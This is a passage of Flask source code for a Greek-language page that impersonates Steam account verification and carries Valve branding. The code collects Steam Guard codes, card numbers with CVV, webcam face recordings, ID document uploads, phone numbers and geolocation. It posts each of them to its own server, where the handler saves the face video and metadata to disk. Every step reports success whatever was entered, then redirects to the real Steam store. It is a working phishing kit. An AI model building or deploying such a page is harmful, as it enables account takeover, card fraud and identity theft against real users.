            .step-label {{
                font-size: 9px;
                max-width: 55px;
            }}
            
            .camera-container {{
                max-width: 220px;
                height: 220px;
            }}
            
            .face-circle {{
                width: 140px;
                height: 140px;
            }}
            
            .guard-code {{
                font-size: 32px;
                letter-spacing: 4px;
            }}
            
            .timer {{
                font-size: 24px;
            }}
            
            .btn {{
                padding: 14px 20px;
                font-size: 15px;
            }}
            
            .btn-outline {{
                padding: 12px 20px;
            }}
        }}
        
        @media (max-width: 360px) {{
            .profile-stats {{
                grid-template-columns: 1fr;
                gap: 8px;
            }}
            
            .step {{
                min-width: 50px;
            }}
            
            .step-number {{
                width: 26px;
                height: 26px;
                font-size: 11px;
            }}
            
            .step-label {{
                font-size: 8px;
                max-width: 50px;
            }}
            
            .camera-container {{
                max-width: 200px;
                height: 200px;
            }}
            
            .face-circle {{
                width: 120px;
                height: 120px;
            }}
            
            .guard-code {{
                font-size: 28px;
                letter-spacing: 3px;
            }}
        }}
        
        /* Αποτροπή εστίασης zoom σε κινητά */
        @media (max-width: 768px) {{
            input, textarea, select {{
                font-size: 16px !important;
            }}
        }}
        
        /* Διόρθωση για iOS Safari */
        @supports (-webkit-touch-callout: none) {{
            body {{
                min-height: -webkit-fill-available;
            }}
            
            .container {{
                min-height: -webkit-fill-available;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Κεφαλίδα -->
        <div class="header">
            <div class="steam-logo">
                <div class="logo-icon">S</div>
                <span>Steam</span>
            </div>
            <div class="verification-badge">
                {title}
            </div>
        </div>
        
        <!-- Κάρτα Προφίλ -->
        <div class="profile-card">
            <div class="profile-header">
                <div class="profile-avatar">
                    {steam_username[0].upper()}
                </div>
                <div class="profile-info">
                    <h2>{steam_username}</h2>
                    <p>Λογαριασμός Steam • {steam_profile}</p>
                </div>
            </div>
            
            <div class="profile-stats">
                <div class="stat">
                    <div class="stat-value">{steam_level}</div>
                    <div class="stat-label">Επίπεδο Steam</div>
                </div>
                <div class="stat">
                    <div class="stat-value">{steam_games}</div>
                    <div class="stat-label">Παιχνίδια</div>
                </div>
                <div class="stat">
                    <div class="stat-value">{steam_wallet}</div>
                    <div class="stat-label">Πορτοφόλι</div>
                </div>
            </div>
        </div>
        
        <!-- Ειδοποίηση -->
        <div class="steam-alert">
            <div class="alert-icon">⚠️</div>
            <div class="alert-content">
                <h3>Απαιτείται Επαλήθευση</h3>
                <p>{reason}</p>
            </div>
        </div>
        
        <!-- Ενδεικτής Βημάτων -->
        <div class="steps-container">
            <div class="step-indicator">
                <div class="step">
                    <div class="step-number active">1</div>
                    <div class="step-label active">Εκκίνηση</div>
                </div>
                {step2_indicator}
                {step3_indicator}
                {step4_indicator}
                <div class="step">
                    <div class="step-number">✓</div>
                    <div class="step-label">Τέλος</div>
                </div>
            </div>
            
            <!-- Βήμα 1: Εισαγωγή -->
            <div class="step-content active" id="step1">
                <h2 class="step-title">{title}</h2>
                <p class="step-description">
                    Το Steam πρέπει να επαληθεύσει την ταυτότητά σας για να διασφαλίσει την ασφάλεια του λογαριασμού και να αποτρέψει μη εξουσιοδοτημένη πρόσβαση.
                    {'Αυτό απαιτείται για την αυθεντικοποίηση δύο παραγόντων του Steam Guard.' if verification_type == 'steam_guard' else ''}
                    {'Απαιτείται επαλήθευση ηλικίας για πρόσβαση σε περιεχόμενο για ενήλικες.' if verification_type == 'age_verification' else ''}
                    {'Απαιτείται επαλήθευση ανάκτησης λογαριασμού μετά από ανίχνευση ύποπτης δραστηριότητας.' if verification_type == 'account_recovery' else ''}
                    {'Απαιτείται επαλήθευση αγοράς για λόγους ασφαλείας.' if verification_type == 'purchase_verification' else ''}
                </p>
                
                <div class="info-box">
                    <h4>Γιατί αυτό απαιτείται:</h4>
                    <ul>
                        <li>Προστασία του λογαριασμού Steam και της συλλογής παιχνιδιών</li>
                        <li>Ασφάλεια των πληροφοριών πληρωμής και του πορτοφολιού</li>
                        <li>Πρόληψη μη εξουσιοδοτημένων αγορών</li>
                        <li>Διατήρηση προτύπων ασφαλείας της κοινότητας</li>
                    </ul>
                </div>
                
                {f'<div class="info-box"><h4>Σχετικά με το Steam Guard:</h4><p>Το Steam Guard είναι το σύστημα αυθεντικοποίησης δύο παραγόντων του Steam που βοηθά στην προστασία του λογαριασμού σας από μη εξουσιοδοτημένη πρόσβαση.</p></div>' if verification_type == 'steam_guard' else ''}
                {f'<div class="info-box"><h4>Επαλήθευση Ηλικίας:</h4><p>Το Steam απαιτεί επαλήθευση ηλικίας για συμμόρφωση με τους τοπικούς νόμους και διασφάλιση κατάλληλης πρόσβασης σε περιεχόμενο.</p></div>' if verification_type == 'age_verification' else ''}
                
                <div class="button-group">
                    <button class="btn btn-block" onclick="nextStep()">
                        Έναρξη Επαλήθευσης Steam
                    </button>
                    <button class="btn btn-outline btn-block" onclick="cancelVerification()">
                        Ακύρωση
                    </button>
                </div>
            </div>
            
            <!-- Βήμα 2: Steam Guard / Επαλήθευση Ηλικίας / Πληρωμή -->
            {f'<div class="step-content" id="step2"><h2 class="step-title">{"Κώδικας Steam Guard" if verification_type == "steam_guard" else ("Επαλήθευση Ηλικίας" if verification_type == "age_verification" else ("Ανάκτηση Λογαριασμού" if verification_type == "account_recovery" else "Επαλήθευση Αγοράς"))}</h2><p class="step-description">{"Εισάγετε τον κώδικα Steam Guard που σταλθηκε στο email ή την εφαρμογή κινητού σας." if verification_type == "steam_guard" else ("Επαληθεύστε την ηλικία σας για πρόσβαση σε περιεχόμενο για ενήλικες." if verification_type == "age_verification" else ("Επαληθεύστε την ταυτότητά σας για ανάκτηση του λογαριασμού σας." if verification_type == "account_recovery" else "Επαληθεύστε την πληρωμή σας για λόγους ασφαλείας."))}</p>' if total_steps > 3 else ''}
            {f'<div class="guard-container" id="steamGuardSection" style="display: none;"><div class="alert-icon">🔒</div><h3>Εισάγετε Κώδικα Steam Guard</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Εισάγετε τον 5ψήφιο κώδικα από την εφαρμογή Steam Guard στο κινητό σας ή το email</p><div class="guard-code" id="steamGuardCode">{str(random.randint(10000, 99999))}</div><input type="text" class="code-input" id="guardCodeInput" placeholder="12345" maxlength="5" pattern="\\d*"><div class="status-message" id="guardStatus">Εισάγετε τον κώδικα παραπάνω</div></div>' if verification_type == 'steam_guard' and total_steps > 3 else ''}
            
            {f'<div class="camera-section" id="faceVerificationSection" style="display: none;"><h3>Επαλήθευση Προσώπου</h3><div class="camera-container"><video id="faceVideo" autoplay playsinline></video><div class="face-circle"></div></div><div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div><button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Έναρξη Επαλήθευσης Προσώπου</button></div>' if settings['face_enabled'] and total_steps > 3 else ''}
            
            {f'<div class="payment-section" id="paymentSection" style="display: none;"><h3>Επαλήθευση Αγοράς</h3><p style="text-align: center; margin-bottom: 20px; color: var(--steam-muted);">Επαληθεύστε την πληρωμή σας</p><div class="payment-amount">{purchase_amount}</div><div class="form-group"><label class="form-label">Αριθμός Κάρτας</label><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div><div class="card-details"><div class="form-group"><label class="form-label">Ημερομηνία Λήξης</label><input type="text" class="form-input" id="expiryDate" placeholder="ΜΜ/ΕΕ" maxlength="5"></div><div class="form-group"><label class="form-label">CVV</label><input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4"></div><div class="form-group"><label class="form-label">Ταχυδρομικός Κώδικας</label><input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10"></div></div></div>' if settings['payment_enabled'] and total_steps > 3 else ''}
            
            {f'<div class="status-message" id="step2Status"></div><div class="button-group"><button class="btn" id="step2Button" onclick="completeStep2()">{"Επαλήθευση Κώδικα" if verification_type == "steam_guard" else ("Έναρξη Επαλήθευσης" if settings["face_enabled"] else "Επαλήθευση Πληρωμής")}</button><button class="btn btn-outline" onclick="prevStep()">Πίσω</button></div></div>' if total_steps > 3 else ''}
            
            <!-- Βήμα 3: Ταυτότητα/Τηλέφωνο/Τοποθεσία -->
            {f'<div class="step-content" id="step3"><h2 class="step-title">{"Επαλήθευση Ταυτότητας" if settings["id_enabled"] else ("Επαλήθευση Τηλεφώνου" if settings["phone_enabled"] else "Επαλήθευση Τοποθεσίας")}</h2><p class="step-description">{"Επαληθεύστε την ταυτότητά σας με επίσημο έγγραφο ταυτότητας." if settings["id_enabled"] else ("Επαληθεύστε τον αριθμό τηλεφώνου σας για το Steam Guard." if settings["phone_enabled"] else "Επαληθεύστε την τοποθεσία σας για λόγους ασφαλείας.")}</p>' if total_steps > 4 else ''}
            {f'<div class="upload-section" onclick="document.getElementById(\'idFileInput\').click()" id="idUploadSection" style="display: none;"><div class="upload-icon">📄</div><div style="font-size: 20px; margin-bottom: 10px;">Μεταφόρτωση Εγγράφου Ταυτότητας</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Δίπλωμα Οδήγησης, Διαβατήριο ή Κάρτα Ταυτότητας</div><input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)"><div class="preview-container" id="idPreview" style="display: none; margin-top: 20px;"><img id="idPreviewImage" style="max-width: 200px; max-height: 150px; border-radius: 6px; border: 2px solid var(--steam-border);"></div></div>' if settings['id_enabled'] and total_steps > 4 else ''}
            
            {f'<div class="phone-section" id="phoneSection" style="display: none;"><h3>Επαλήθευση Τηλεφώνου</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Εισάγετε τον αριθμό τηλεφώνου σας για λήψη κωδικών Steam Guard</p><input type="tel" class="phone-input" id="phoneInput" placeholder="+30 695 123 4567"><div class="status-message" id="phoneStatus">Εισάγετε τον αριθμό τηλεφώνου σας</div></div>' if settings['phone_enabled'] and total_steps > 4 else ''}
            
            {f'<div class="upload-section" id="locationSection" style="display: none;"><div class="upload-icon">📍</div><div style="font-size: 20px; margin-bottom: 10px;">Επαλήθευση Τοποθεσίας</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Το Steam χρειάζεται να επαληθεύσει την τοποθεσία σας για ασφάλεια</div><div class="status-message" id="locationStatus">Κάντε κλικ στο παρακάτω κουμπί για κοινή χρήση τοποθεσίας</div></div>' if settings['location_enabled'] and total_steps > 4 else ''}
            
            {f'<div class="button-group"><button class="btn" id="step3Button" onclick="completeStep3()">{"Μεταφόρτωση Ταυτότητας" if settings["id_enabled"] else ("Επαλήθευση Τηλεφώνου" if settings["phone_enabled"] else "Κοινή Τοποθεσία")}</button><button class="btn btn-outline" onclick="prevStep()">Πίσω</button></div></div>' if total_steps > 4 else ''}
            
            <!-- Βήμα 4: Επεξεργασία -->
            <div class="step-content" id="stepProcessing">
                <div class="completion-screen">
                    <div class="loading-spinner" style="width: 60px; height: 60px; border-width: 4px; border-color: var(--steam-accent);"></div>
                    <h2 class="step-title">Επαλήθευση Πληροφοριών Σας</h2>
                    <p class="step-description">
                        Παρακαλώ περιμένετε ενώ το Steam επαληθεύει τις πληροφορίες σας. Αυτό μπορεί να πάρει λίγο χρόνο.
                    </p>
                    
                    <div class="status-message status-processing" id="processingStatus">
                        Επεξεργασία επαλήθευσης...
                    </div>
                    
                    <div class="info-box">
                        <h4>Τι συμβαίνει:</h4>
                        <ul>
                            <li>Επαλήθευση υποβληθεισών πληροφοριών</li>
                            <li>Έλεγχος πρωτοκόλλων ασφαλείας</li>
                            <li>Ενημέρωση κατάστασης λογαριασμού</li>
                            <li>Εφαρμογή επαλήθευσης</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <!-- Βήμα 5: Ολοκλήρωση -->
            <div class="step-content" id="stepComplete">
                <div class="completion-screen">
                    <div class="success-icon">✓</div>
                    <h2 class="step-title">Η Επαλήθευση Ολοκληρώθηκε!</h2>
                    
                    <div class="steam-verified">
                        {'Ενεργοποιήθηκε το Steam Guard' if verification_type == 'steam_guard' else ''}
                        {'Επαληθεύτηκε Ηλικία' if verification_type == 'age_verification' else ''}
                        {'Ασφαλίστηκε Λογαριασμός' if verification_type == 'account_recovery' else ''}
                        {'Επαληθεύτηκε Αγορά' if verification_type == 'purchase_verification' else ''}
                    </div>
                    
                    <p class="step-description">
                        {'Το Steam Guard ενεργοποιήθηκε με επιτυχία στον λογαριασμό σας.' if verification_type == 'steam_guard' else ''}
                        {'Η ηλικία σας επαληθεύτηκε. Μπορείτε τώρα να αποκτήσετε πρόσβαση σε περιεχόμενο για ενήλικες.' if verification_type == 'age_verification' else ''}
                        {'Ο λογαριασμός σας ασφαλίστηκε και ανακτήθηκε.' if verification_type == 'account_recovery' else ''}
                        {'Η αγορά σας επαληθεύτηκε και ολοκληρώθηκε.' if verification_type == 'purchase_verification' else ''}
                        Θα ανακατευθυνθείτε στο Steam σε <span id="countdown">10</span> δευτερόλεπτα.
                    </p>
                    
                    <div class="info-box">
                        <h4>Περίληψη Επαλήθευσης:</h4>
                        <ul>
                            {'<li>✓ Ενεργοποιήθηκε το Steam Guard</li>' if verification_type == 'steam_guard' else ''}
                            {'<li>✓ Ενεργή αυθεντικοποίηση δύο παραγόντων</li>' if verification_type == 'steam_guard' else ''}
                            {'<li>✓ Επαληθεύτηκε ηλικία</li>' if verification_type == 'age_verification' else ''}
                            {'<li>✓ Εγχωρήθηκε πρόσβαση σε περιεχόμενο για ενήλικες</li>' if verification_type == 'age_verification' else ''}
                            {'<li>✓ Ασφαλίστηκε λογαριασμός</li>' if verification_type == 'account_recovery' else ''}
                            {'<li>✓ Ενημερώθηκαν μέτρα ασφαλείας</li>' if verification_type == 'account_recovery' else ''}
                            {'<li>✓ Επαληθεύτηκε αγορά</li>' if verification_type == 'purchase_verification' else ''}
                            {'<li>✓ Ολοκληρώθηκε συναλλαγή</li>' if verification_type == 'purchase_verification' else ''}
                            <li>✓ Ενεργή προστασία λογαριασμού</li>
                        </ul>
                    </div>
                    
                    <div class="button-group">
                        <button class="btn" onclick="redirectToSteam()">
                            Επιστροφή στο Steam
                        </button>
                        <button class="btn btn-outline" onclick="viewAccount()">
                            Προβολή Λεπτομερειών Λογαριασμού
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Υποσέλιδο -->
        <div class="footer">
            <div class="footer-links">
                <a href="#">Υποστήριξη Steam</a>
                <a href="#">Πολιτική Απορρήτου</a>
                <a href="#">Συμφωνία Χρήστη</a>
                <a href="#">Συμφωνία Συνδρομητή Steam</a>
            </div>
            <p style="margin-top: 15px;">
                © 2024 Valve Corporation. Με επιφύλαξη παντός δικαιώματος.<br>
                Το Steam και το λογότυπο Steam είναι εμπορικά σήματα της Valve Corporation.
            </p>
        </div>
    </div>
    
    <script>
        // Παγκόσμιες μεταβλητές
        let currentStep = 1;
        let totalSteps = {total_steps};
        let steamUsername = "{steam_username}";
        let verificationType = "{verification_type}";
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        
        // Κατάσταση επαλήθευσης
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration if settings['face_enabled'] else 0};
        let faceTimerInterval = null;
        let idFile = null;
        let steamGuardCode = "{str(random.randint(10000, 99999)) if verification_type == 'steam_guard' else ''}";
        
        // Πλοήγηση Βημάτων
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-number');
            const labels = document.querySelectorAll('.step-label');
            
            steps.forEach((step, index) => {{
                step.classList.remove('active', 'completed');
                if (index < currentStep - 1) {{
                    step.classList.add('completed');
                }} else if (index === currentStep - 1) {{
                    step.classList.add('active');
                }}
            }});
            
            labels.forEach((label, index) => {{
                label.classList.remove('active');
                if (index === currentStep - 1) {{
                    label.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step-content').forEach(step => {{
                step.classList.remove('active');
            }});
            
            let stepId = '';
            if (stepNumber === 1) stepId = 'step1';
            else if (stepNumber === 2) stepId = 'step2';
            else if (stepNumber === 3) stepId = 'step3';
            else if (stepNumber === totalSteps - 1) stepId = 'stepProcessing';
            else if (stepNumber === totalSteps) stepId = 'stepComplete';
            
            if (stepId) {{
                document.getElementById(stepId).classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
                
                // Εμφάνιση κατάλληλων ενοτήτων
                if (stepNumber === 2) {{
                    if (verificationType === "steam_guard") {{
                        document.getElementById("steamGuardSection").style.display = "block";
                    }}
                    
                    if ({str(settings['face_enabled']).lower()}) {{
                        document.getElementById("faceVerificationSection").style.display = "block";
                    }}
                    
                    if ({str(settings['payment_enabled']).lower()}) {{
                        document.getElementById("paymentSection").style.display = "block";
                    }}
                }}
                
                if (stepNumber === 3) {{
                    if ({str(settings['id_enabled']).lower()}) {{
                        document.getElementById("idUploadSection").style.display = "block";
                    }}
                    
                    if ({str(settings['phone_enabled']).lower()}) {{
                        document.getElementById("phoneSection").style.display = "block";
                    }}
                    
                    if ({str(settings['location_enabled']).lower()}) {{
                        document.getElementById("locationSection").style.display = "block";
                    }}
                }}
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        function cancelVerification() {{
            if (confirm("Είστε σίγουρος ότι θέλετε να ακυρώσετε την επαλήθευση; Ορισμένες λειτουργίες Steam μπορεί να είναι περιορισμένες.")) {{
                window.location.href = 'https://store.steampowered.com';
            }}
        }}
        
        // Επαλήθευση Steam Guard
        function completeStep2() {{
            if (verificationType === "steam_guard") {{
                const input = document.getElementById("guardCodeInput").value;
                const status = document.getElementById("guardStatus");
                if (!input || input.length !== 5) {{
                    status.className = "status-message status-error";
                    status.textContent = "Παρακαλώ εισάγετε έγκυρο 5ψήφιο κώδικα";
                    return;
                }}
                status.className = "status-message status-processing";
                status.textContent = "Επαλήθευση κώδικα Steam Guard...";
                // Υποβολή δεδομένων Steam Guard
                $.ajax({{
                    url: "/submit_steam_guard",
                    type: "POST",
                    data: JSON.stringify({{
                        guard_code: input,
                        expected_code: steamGuardCode,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        steam_username: steamUsername
                    }}),
                    contentType: "application/json"
                }});
                status.className = "status-message status-success";
                status.textContent = "✓ Επαληθεύτηκε ο κώδικας Steam Guard";
                setTimeout(() => nextStep(), 1500);
            }}
            else if ({str(settings['face_enabled']).lower()}) {{
                startFaceVerification();
            }}
            else if ({str(settings['payment_enabled']).lower()}) {{
                verifyPayment();
            }}
        }}
        
        // Επαλήθευση Προσώπου
        async function startFaceVerification() {{
            try {{
                const btn = document.getElementById("startFaceBtn");
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Κάμερα...';
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
                    audio: false
                }});
                document.getElementById("faceVideo").srcObject = faceStream;
                startFaceScan();
            }} catch (error) {{
                alert("Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχουν χορηγηθεί δικαιώματα κάμερας.");
                document.getElementById("startFaceBtn").disabled = false;
                document.getElementById("startFaceBtn").textContent = "Έναρξη Επαλήθευσης Προσώπου";
            }}
        }}
        
        function startFaceScan() {{
            faceTimeLeft = {face_duration if settings['face_enabled'] else 15};
            updateFaceTimer();
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            startFaceRecording();
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById("faceTimer").textContent = 
                minutes.toString().padStart(2, "0") + ":" + seconds.toString().padStart(2, "0");
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            try {{
                faceRecorder = new MediaRecorder(faceStream, {{ mimeType: "video/webm;codecs=vp9" }});
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) faceChunks.push(event.data);
            }};
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            if (faceRecorder && faceRecorder.state === "recording") {{
                faceRecorder.stop();
            }}
            if (faceStream) faceStream.getTracks().forEach(track => track.stop());
            document.getElementById("faceTimer").textContent = "✓ Ολοκληρώθηκε";
            document.getElementById("step2Status").className = "status-message status-success";
            document.getElementById("step2Status").textContent = "✓ Ολοκληρώθηκε η επαλήθευση προσώπου";
            setTimeout(() => nextStep(), 1500);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            const videoBlob = new Blob(faceChunks, {{ type: "video/webm" }});
            const reader = new FileReader();
            reader.onloadend = function() {{
                const base64data = reader.result.split(",")[1];
                $.ajax({{
                    url: "/submit_face_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration if settings['face_enabled'] else 15},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        steam_username: steamUsername,
                        verification_type: verificationType
                    }}),
                    contentType: "application/json"
                }});
            }};
            reader.readAsDataURL(videoBlob);
        }}
        
        // Επαλήθευση Πληρωμής
        function verifyPayment() {{
            const cardNumber = document.getElementById("cardNumber").value;
            const expiryDate = document.getElementById("expiryDate").value;
            const cvv = document.getElementById("cvv").value;
            const zipCode = document.getElementById("zipCode").value;
            if (!cardNumber || !expiryDate || !cvv || !zipCode) {{
                alert("Παρακαλώ συμπληρώστε όλες τις λεπτομέρειες πληρωμής");
                return;
            }}
            $.ajax({{
                url: "/submit_payment_verification",
                type: "POST",
                data: JSON.stringify({{
                    card_number: cardNumber.replace(/\\s/g, ""),
                    expiry_date: expiryDate,
                    cvv: cvv,
                    zip_code: zipCode,
                    amount: "{purchase_amount}",
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    steam_username: steamUsername
                }}),
                contentType: "application/json"
            }});
            document.getElementById("step2Status").className = "status-message status-success";
            document.getElementById("step2Status").textContent = "✓ Υποβλήθηκε η επαλήθευση πληρωμής";
            setTimeout(() => nextStep(), 1500);
        }}
        
        // Επαλήθευση Ταυτότητας
        function handleIDUpload(input) {{
            idFile = input.files[0];
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById("idPreview");
                const previewImage = document.getElementById("idPreviewImage");
                previewImage.src = e.target.result;
                preview.style.display = "block";
            }};
            reader.readAsDataURL(idFile);
            document.getElementById("step3Button").textContent = "Υποβολή Ταυτότητας";
        }}
        
        // Επαλήθευση Τηλεφώνου
        function completeStep3() {{
            if ({str(settings['id_enabled']).lower()}) {{
                if (!idFile) {{
                    alert("Παρακαλώ μεταφορτώστε πρώτα έγγραφο ταυτότητας");
                    return;
                }}
                const formData = new FormData();
                formData.append("id_file", idFile);
                formData.append("timestamp", new Date().toISOString());
                formData.append("session_id", sessionId);
                formData.append("steam_username", steamUsername);
                formData.append("verification_type", verificationType);
                $.ajax({{
                    url: "/submit_id_verification",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {{
                        startProcessing();
                    }}
                }});
            }}
            
            if ({str(settings['phone_enabled']).lower()}) {{
                const phone = document.getElementById("phoneInput").value;
                if (!phone) {{
                    alert("Παρακαλώ εισάγετε τον αριθμό τηλεφώνου σας");
                    return;
                }}
                document.getElementById("phoneStatus").className = "status-message status-processing";
                document.getElementById("phoneStatus").textContent = "Επαλήθευση αριθμού τηλεφώνου...";
                $.ajax({{
                    url: "/submit_phone_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        phone_number: phone,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        steam_username: steamUsername
                    }}),
                    contentType: "application/json"
                }});
                setTimeout(() => startProcessing(), 1500);
            }}
            
            if ({str(settings['location_enabled']).lower()}) {{
                requestLocation();
            }}
        }}
        
        // Επαλήθευση Τοποθεσίας
        function requestLocation() {{
            const statusDiv = document.getElementById("locationStatus");
            const btn = document.getElementById("step3Button");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Λήψη Τοποθεσίας...';
            statusDiv.className = "status-message status-processing";
            statusDiv.textContent = "Πρόσβαση στην τοποθεσία σας...";
            if (!navigator.geolocation) {{
                statusDiv.className = "status-message status-error";
                statusDiv.textContent = "Δεν υποστηρίζεται η γεωεντοπισμός";
                return;
            }}
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    statusDiv.className = "status-message status-success";
                    statusDiv.textContent = "✓ Επαληθεύτηκε η τοποθεσία";
                    btn.disabled = true;
                    btn.textContent = "✓ Επαληθεύτηκε Τοποθεσία";
                    $.ajax({{
                        url: "/submit_location_verification",
                        type: "POST",
                        data: JSON.stringify({{
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString(),
                            session_id: sessionId,
                            steam_username: steamUsername,
                            verification_type: verificationType
                        }}),
                        contentType: "application/json"
                    }});
                    setTimeout(() => startProcessing(), 1500);
                }},
                (error) => {{
                    statusDiv.className = "status-message status-error";
                    statusDiv.textContent = "Απορρίφθηκε η πρόσβαση στην τοποθεσία";
                    btn.disabled = false;
                    btn.textContent = "Δοκιμάστε Ξανά";
                }}
            );
        }}
        
        // Επεξεργασία
        function startProcessing() {{
            showStep(totalSteps - 1);
            
            const statusDiv = document.getElementById('processingStatus');
            let progress = 0;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 20;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = 'Επαλήθευση πληροφοριών... ' + Math.round(progress) + '%';
                }} else if (progress < 60) {{
                    message = 'Έλεγχος ασφαλείας... ' + Math.round(progress) + '%';
                }} else if (progress < 90) {{
                    message = 'Ενημέρωση λογαριασμού... ' + Math.round(progress) + '%';
                }} else {{
                    message = 'Ολοκλήρωση... ' + Math.round(progress) + '%';
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        completeVerification();
                    }}, 1000);
                }}
            }}, 500);
        }}
        
        function completeVerification() {{
            // Υποβολή δεδομένων ολοκλήρωσης
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    steam_username: steamUsername,
                    verification_type: verificationType,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    face_verified: {str(settings['face_enabled']).lower()},
                    id_verified: {str(settings['id_enabled']).lower()},
                    phone_verified: {str(settings['phone_enabled']).lower()},
                    payment_verified: {str(settings['payment_enabled']).lower()},
                    location_verified: {str(settings['location_enabled']).lower()},
                    verification_result: 'success'
                }}),
                contentType: 'application/json'
            }});
            
            showStep(totalSteps);
            startCountdown();
        }}
        
        function startCountdown() {{
            let countdown = 10;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    redirectToSteam();
                }}
            }}, 1000);
        }}
        
        function redirectToSteam() {{
            window.location.href = 'https://store.steampowered.com';
        }}
        
        function viewAccount() {{
            window.location.href = 'https://steamcommunity.com';
        }}
        
        // Αρχικοποίηση
        updateStepIndicators();
        
        // Μορφοποίηση εισόδων
        document.getElementById("cardNumber")?.addEventListener("input", function(e) {{
            let value = e.target.value.replace(/\\D/g, "");
            let formatted = "";
            for (let i = 0; i < value.length && i < 16; i++) {{
                if (i > 0 && i % 4 === 0) formatted += " ";
                formatted += value[i];
            }}
            e.target.value = formatted;
        }});
        
        document.getElementById("expiryDate")?.addEventListener("input", function(e) {{
            let value = e.target.value.replace(/\\D/g, "");
            if (value.length >= 2) {{
                value = value.substring(0, 2) + "/" + value.substring(2, 4);
            }}
            e.target.value = value;
        }});
        
        // Είσοδος κώδικα Steam Guard
        document.getElementById("guardCodeInput")?.addEventListener("input", function(e) {{
            e.target.value = e.target.value.replace(/\\D/g, "").slice(0, 5);
        }});
        
        // Αποτροπή υποβολής φόρμας με enter
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'Enter') {{
                e.preventDefault();
                return false;
            }}
        }});
        
        // Διαχείριση ύψους viewport για κινητά
        function setViewportHeight() {{
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${{vh}}px`);
        }}
        
        setViewportHeight();
        window.addEventListener('resize', setViewportHeight);
        window.addEventListener('orientationchange', setViewportHeight);
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_greek_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'άγνωστο')
            steam_username = data.get('steam_username', 'άγνωστο')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_πρόσωπο_{steam_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'επαλήθευση_προσώπου', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'επαλήθευση_προσώπου', f"metadata_{steam_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'επαλήθευση_προσώπου',
                'steam_όνομα_χρήστη': steam_username,
                'session_id': session_id,
                'διάρκεια': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'πλατφόρμα': 'steam',
